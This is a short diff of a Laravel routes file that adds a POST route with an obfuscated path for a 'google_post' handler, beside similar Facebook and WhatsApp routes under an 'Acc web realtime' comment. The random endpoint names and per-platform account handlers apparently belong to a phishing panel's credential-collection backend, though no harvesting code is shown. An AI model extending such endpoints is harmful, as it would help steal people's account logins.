@@ -10,6 +10,7 @@ Route::post('nfrhvgbibgnjhbngfjibngj', [NormalWeb::class, 'post'])->name('post.n
 // Acc web realtime
 Route::post('jirejfgihfvbgjfdighuifdghuibhdbg', [RealtimeWeb::class, 'facebook_post'])->name('post.realtimeweb.facebook');
 Route::post('jikfdjbiovdjhgiiureiutrgurthu', [RealtimeWeb::class, 'whatsapp_post'])->name('post.realtimeweb.whatsapp');
+Route::post('knmgvbrnjbikdgjkndfgbjkndfg8383', [RealtimeWeb::class, 'google_post'])->name('post.realtimeweb.google');
 // acc custom web
 Route::post('jfjhgjg85758tyughfghg', [CustomWeb::class, 'facebook_post'])->name('post.customweb.facebook');
 Route::post('kmcnvmvkfo3058hgjvmnv', [CustomWeb::class, 'whatsapp_post'])->name('post.customweb.whatsapp');
